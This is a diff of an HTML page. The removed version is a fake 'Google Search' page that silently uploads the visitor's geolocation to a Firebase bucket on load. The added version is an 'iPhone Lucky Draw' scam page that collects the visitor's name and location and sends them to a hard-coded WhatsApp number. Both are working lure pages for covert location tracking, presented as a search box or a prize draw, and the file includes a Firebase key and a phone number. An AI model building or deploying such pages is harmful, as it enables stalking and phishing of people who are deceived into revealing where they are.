@@ -1,107 +1,98 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Search</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f0f0f0;
-        }
-        .container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .search-form {
-            text-align: center;
-        }
-        .search-input {
-            padding: 10px;
-            font-size: 16px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            margin-right: 5px;
-        }
-        .search-button {
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #4285f4;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .search-button:hover {
-            background-color: #357ae8;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>iPhone Lucky Draw</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f0f0f0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .container img {
+      max-width: 100%;
+      height: auto;
+    }
+    .name-bar {
+      margin-top: 20px;
+    }
+    .name-bar input {
+      padding: 10px;
+      width: 80%;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    .info-text {
+      margin-top: 20px;
+    }
+    .btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .btn:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
-<body onload="uploadLocation()">
-    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-storage.js"></script>
-    <div class="container">
-        <form class="search-form" action="https://www.google.com/search" method="GET">
-            <input class="search-input" type="text" name="q" placeholder="Search Google">
-            <button class="search-button" type="submit">Search</button>
-        </form>
+<body>
+  <div class="container">
+    <h1>iPhone Lucky Draw</h1>
+    <img src="iphone_image.jpg" alt="iPhone Image" width="200" height="300">
+
+    <div class="name-bar">
+      <input type="text" id="userName" placeholder="Enter your name">
     </div>
-    <script>
-        // Function to get current location and upload to Firebase
-        function uploadLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    var latitude = position.coords.latitude;
-                    var longitude = position.coords.longitude;
-                    var mapLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+    <p class="info-text">Click the below button, send the bill id to us, we will notify you if you won</p>
+    <button class="btn" onclick="sendDetails()">Send Bill ID</button>
+  </div>
 
-                    // Create a text file with the Google Maps link
-                    var fileContent = "Current Location: " + mapLink;
+  <script>
+    function sendDetails() {
+    var userName = document.getElementById('userName').value;
+    var billID = generateBillID();
+    // Assuming you have a function to get user's location
+    getUserLocation(function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const locationMessage = ` https://www.google.com/maps?q=${latitude},${longitude}`;
+        const whatsappNumber = "+918015153603";
+        const message = "Name: " + userName + "\nBill ID: " + billID + "\n" + locationMessage;
+        sendToWhatsApp(message, whatsappNumber);
+    });
+}
 
-                    // Initialize Firebase
-                    var firebaseConfig = {
-                        apiKey: "YAIzaSyBwuYaxpaMlQMYt7lwC4dH5DXtOPkh90pA",
-                        projectId: "sample-project-admin-73138",
-                        storageBucket: "gs://sample-project-admin-73138.appspot.com"
-                    };
-                    firebase.initializeApp(firebaseConfig);
+function generateBillID() {
+    // Generate a random bill ID, you can customize this logic as per your requirement
+    return Math.random().toString(36).substring(7);
+}
 
-                    // Get a reference to the storage service, which is used to create references in your storage bucket
-                    var storage = firebase.storage();
+function sendToWhatsApp(message, whatsappNumber) {
+    const whatsappLink = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
+    window.open(whatsappLink, "_blank");
+}
 
-                    // Create a storage reference from our storage service
-                    var storageRef = storage.ref();
+function getUserLocation(callback) {
+    // Use Geolocation API to get user's current position
+    navigator.geolocation.getCurrentPosition(callback);
+}
 
-                    // Create a reference to the location where the text file will be saved
-                    var textRef = storageRef.child('location.txt');
-
-                    // Create the file metadata
-                    var metadata = {
-                        contentType: 'text/plain'
-                    };
-
-                    // Upload the file and metadata
-                    var uploadTask = textRef.putString(fileContent, 'raw', metadata);
-
-                    // Listen for state changes, errors, and completion of the upload.
-                    uploadTask.on('state_changed', function(snapshot) {
-                        // Observe state change events such as progress, pause, and resume
-                    }, function(error) {
-                        // Handle unsuccessful uploads
-                        console.error("Error uploading file: ", error);
-                    }, function() {
-                        // Handle successful uploads on complete
-                        console.log("File uploaded successfully!");
-                    });
-                });
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        }
-    </script>
+  </script>
 </body>
 </html>
